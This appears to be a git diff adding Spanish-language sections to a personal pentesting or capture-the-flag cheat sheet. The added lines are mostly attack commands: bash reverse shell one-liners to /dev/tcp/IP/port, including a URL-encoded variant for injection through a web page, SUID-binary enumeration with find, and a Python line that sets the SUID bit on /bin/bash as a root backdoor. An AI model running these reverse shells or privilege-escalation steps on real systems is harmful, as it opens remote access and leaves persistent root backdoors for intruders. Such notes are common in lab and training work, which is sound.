@@ -33,16 +33,53 @@ stty -echo raw;fg
     reset
 export TERM=xterm
 export SHELL=bash
+stty rows  51 columns 189
 ```
 
 
+## Spawn shells
+
+Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 
+
+```bash
+
+bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
+bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
+
+```
+
+## Sudo
+
+```
+sudo -u asuser whoami
+
+```
 
 
+## Enum
 
+```
+lsb_release -a
+systemctl-timers
+watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
+```
 
+## Find
 
+```
+find \-perm -4000 2>/dev/null
 
+```
 
+## SUID
+
+```python
+
+import os
+
+os.system("chmod u+s /bin/bash")
+
+```
 
 
 
